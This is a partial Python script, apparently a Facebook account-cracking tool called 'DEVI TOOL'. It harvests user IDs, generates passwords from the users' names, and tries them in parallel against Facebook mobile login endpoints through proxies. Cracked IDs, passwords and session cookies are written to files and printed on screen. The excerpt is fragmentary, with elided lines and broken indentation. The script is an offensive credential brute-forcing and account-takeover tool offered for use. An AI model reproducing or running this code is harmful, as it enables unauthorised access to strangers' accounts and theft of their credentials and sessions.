...
os.system('espeak -a 300 " WELCOME TO DEVI TOOL"')
import requests
...
princp=[]
try:
	prox= requests.get('https://raw.githubusercontent.com/Kickwinnerz/Approval/master/Approval.txt').text
...
def lok():
	...
	for user in uid:
	    try:
	       ...
	       url = requests.get('https://graph.facebook.com/{}'.format(user),pDEVIms=pDEVIms,headers=head,cookies={'cookies':cok}).json()
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append(frs+' '+frs)
			if 'mobile' in method:
				pool.submit(crackmobile_DEVI,idf,pwv,nmf)
			elif 'x' in method:
				pool.submit(crackx_DEVI,idf,pwv,nmf)
			elif 'd' in method:
				pool.submit(crackd_DEVI,idf,pwv,nmf)
			elif 'p' in method:
				pool.submit(crackp_DEVI,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree_DEVI,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv,nmf)
	print(f'{N}[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}DWBDEVI CRACK DAKAY (A/NA) ? ')
...
#--------------------[ METODE-B-API ]-----------------#
def crackmobile_DEVI(idf,pwv,nmf):
	global loop,ok,cp
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				akun.append(idf+'|'+pw)
				cp+=1
				open('/sdcard/DEVI-CP.txt','a').write(f'{idf}|{pe}\n')
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}[DEVI-OK]{G}{idf}{G}|{G}{pw}{PU}\n {PU}COOKIE : {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_DEVI(kuki)
				open('/sdcard/DEVI-OK.txt','a').write(f'{idf}|{pw}\n')
				os.system('espeak -a 300 " DEVI CRACKED OK ID"')
				break
...
def crackx_DEVI(idf,pwv,nmf):
    ...
    'viewport-width': '980',
			...
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}[DEVI-CP]{R}{idf}{R}|{R}{pw}{R}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
...
#free
def crackfree_DEVI(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f'\r{Y}[{Y}%sDEVI{Y}]-{PU}[%s/%s]-{G}[OK:%s]{R}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
